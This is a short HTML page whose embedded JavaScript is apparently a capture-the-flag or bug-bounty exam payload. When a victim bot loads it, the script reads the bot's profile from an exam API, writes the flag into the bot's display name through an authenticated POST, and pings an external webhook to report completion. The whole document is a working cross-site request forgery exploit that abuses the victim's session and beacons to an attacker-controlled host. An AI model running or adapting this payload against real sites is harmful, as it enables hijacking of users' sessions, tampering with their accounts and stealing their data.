<!DOCTYPE html>
<html>
<body>
    <script>
        // 1. Fetch the profile (which has the flag)
        fetch('https://api-bugbounty-exam.hashacademy.co/api/auth/profile')
        .then(r => r.json())
        .then(userData => {
            // 2. The flag is now in 'userData.flag' or 'userData.email'
            // We force the bot to update its NAME to be the FLAG
            return fetch('https://api-bugbounty-exam.hashacademy.co/api/auth/update', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    name: userData.flag || "FLAG-NOT-FOUND", 
                    bio: "Security Audit"
                })
            });
        })
        .then(() => {
            // Confirm to your webhook that the attempt finished
            new Image().src = "https://webhooksite.net/af8d2f8d-349b-48e1-8b7a-78b2294cf0d2/done";
        });
    </script>
</body>
</html>
